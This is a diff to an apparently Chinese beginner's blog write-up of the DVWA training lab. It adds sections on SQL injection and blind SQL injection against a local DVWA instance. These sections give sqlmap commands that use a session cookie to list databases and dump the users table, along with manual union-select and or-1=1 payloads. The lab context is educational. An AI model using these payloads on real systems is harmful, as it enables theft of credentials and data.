@@ -243,7 +243,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2021-05-24 20:18:26" itemprop="dateModified" datetime="2021-05-24T20:18:26+08:00">2021-05-24</time>
+        <time title="修改时间：2021-06-08 19:36:02" itemprop="dateModified" datetime="2021-06-08T19:36:02+08:00">2021-06-08</time>
       </span>
 
   
@@ -336,10 +336,43 @@ if( isset( $_POST[ 'btnSign' ] ) ) {
 <p>DOM型XSS其实是一种特殊类型的反射型XSS，DOM是文档对象模型balbalbala那一堆东西我也不懂是啥，先不做过多的了解。。。</p>
 <p>直接看着做</p>
 <p>先看源码<?php# No protections, anything goes?>（好干净啥也没有？）</p>
-<p>然后default也没过滤于是直接在url构造xss语句就行了</p>
+<p>然后default也没过滤于是直接在url构造xss就行了</p>
 <p><img src="/2021/05/21/dvwa%E5%88%9D%E4%BD%93%E9%AA%8C/QQ%E6%88%AA%E5%9B%BE20210523204739.png" alt="QQ截图20210523204739"></p>
 <p><img src="/2021/05/21/dvwa%E5%88%9D%E4%BD%93%E9%AA%8C/QQ%E6%88%AA%E5%9B%BE20210523204801.png" alt="QQ截图20210523204801"></p>
 <p>（有意思）</p>
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>解析：sql普通注入可以根据报错提示，进行sql语句注入从而直接爆出我们想要的信息，比如数据库版本、数据库名、用户名、操作系统版本等，一般用手注和sqlmap自动注。</p>
+<h2 id="sqlmap自动注入（GET方法）"><a href="#sqlmap自动注入（GET方法）" class="headerlink" title="sqlmap自动注入（GET方法）"></a>sqlmap自动注入（GET方法）</h2><p>新手的我果然还是比较喜欢先尝试用工具嘻嘻</p>
+<p><img src="/2021/05/21/dvwa%E5%88%9D%E4%BD%93%E9%AA%8C/QQ%E6%88%AA%E5%9B%BE20210528193432.png" alt="QQ截图20210528193432"></p>
+<p>got a 302 redirect to，，不能直接用，需要带上cookie，去抓包拿cookie，然后那就把cookie带上进行输入对应的sqlmap命令就能看到东西了，就是这么霸道。</p>
+<p>基础命令如下：</p>
+<p>*<em>-p参数只对指定的参数进行注入，在上述命令中指定了对username参数进行注入</em><br><em>-p username</em><br><em>-v：显示详细的信息，有1-6级，默认为1</em><br><em>-f参数查看指纹信息</em><br><em>–technique 看情况选</em><br><em>B : 基于Boolean的盲注（Boolean based blind）</em><br><em>Q : 内联查询（Inline queries）</em><br><em>T : 基于时间的盲注（time based blind）</em><br><em>U : 基于联合查询（Union query based）</em><br><em>E : 基于错误（error based）</em><br><em>S : 栈查询（stack queries）</em><br><em>–technique 看情况选******</em></p>
+<p><u><strong><em>–dbs：查看目标数据库系统的所有库 -D</em></strong></u><br><u><strong><em>–tables     -T表名</em></strong></u><br><u><strong><em>–columns     -C字段名</em></strong></u><br><u>*<strong>–dump         内容**</strong></u></p>
+<p>先看所有库 </p>
+<p><code>python2 sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=m42j35b05uii73jgpe3am21he0&quot;  --dbs</code><img src="/2021/05/21/dvwa%E5%88%9D%E4%BD%93%E9%AA%8C/QQ%E6%88%AA%E5%9B%BE20210528194000.png" alt="QQ截图20210528194000"></p>
+<p>也可以看相应的表，这里查看了dvwa的表 </p>
+<p><code>python2 sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=m42j35b05uii73jgpe3am21he0&quot;  --dbs -D dvwa --tables</code></p>
+<p><img src="/2021/05/21/dvwa%E5%88%9D%E4%BD%93%E9%AA%8C/QQ%E6%88%AA%E5%9B%BE20210528194217.png" alt="QQ截图20210528194217"></p>
+<p>然后看users的字段和里面的内容</p>
+<p> <code>python2 sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=m42j35b05uii73jgpe3am21he0&quot;  --dbs -D dvwa --tables users --columns --dump</code></p>
+<p><img src="/2021/05/21/dvwa%E5%88%9D%E4%BD%93%E9%AA%8C/QQ%E6%88%AA%E5%9B%BE20210528194823.png" alt="QQ截图20210528194823"></p>
+<p>啥都能看到了！sql注入危害性可大。</p>
+<h2 id="手动注入"><a href="#手动注入" class="headerlink" title="手动注入"></a>手动注入</h2><p>比较适用于所有的情况</p>
+<p>还不熟悉sql语句，查看题解敲。</p>
+<p>先起手式测试注入点：（联合查询注入）   <strong>1’ union select user, password from users#</strong></p>
+<p><img src="/2021/05/21/dvwa%E5%88%9D%E4%BD%93%E9%AA%8C/QQ%E6%88%AA%E5%9B%BE20210528200222.png" alt="QQ截图20210528200222"></p>
+<p>然后闭合   <strong>1’ or ‘1’ =’1</strong> </p>
+<p><img src="/2021/05/21/dvwa%E5%88%9D%E4%BD%93%E9%AA%8C/QQ%E6%88%AA%E5%9B%BE20210528200405.png" alt="QQ截图20210528200405"></p>
+<p>low等级毫无任何过滤直接成功注入，拿到所有信息，结束。</p>
+<h1 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h1><p>解析：盲注就是在sql注入过程中，sql语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。难度比普通注入大很多。</p>
+<p>类型大体分为布尔盲注，时间盲注，报错盲注</p>
+<p>详情参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zane-s/articles/12371820.html#">SQL注入之盲注简单总结 - Zane_S - 博客园 (cnblogs.com)</a></p>
+<h2 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h2><p>直接一套操作秒爆出表，sqlmap果真是相当厉害又方便  </p>
+<p><code>python2 sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=m42j35b05uii73jgpe3am21he0&quot; --technique B  --dbs --batch</code> </p>
+<p><img src="/2021/05/21/dvwa%E5%88%9D%E4%BD%93%E9%AA%8C/QQ%E6%88%AA%E5%9B%BE20210528202422.png" alt="QQ截图20210528202422"></p>
+<p>这个爆的时候是一个表一个表的冒出来，符合盲注特点。</p>
+<p>要查东西也和普通注入的时候一样的命令就行</p>
+<h2 id="手动注入-1"><a href="#手动注入-1" class="headerlink" title="手动注入"></a>手动注入</h2><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/aedf919d08fb">DVWA-SQL Injection(Blind)(SQL盲注) - 简书 (jianshu.com)</a></p>
+<p>一套按照题解可以搞出来。</p>
 
       
     </div>
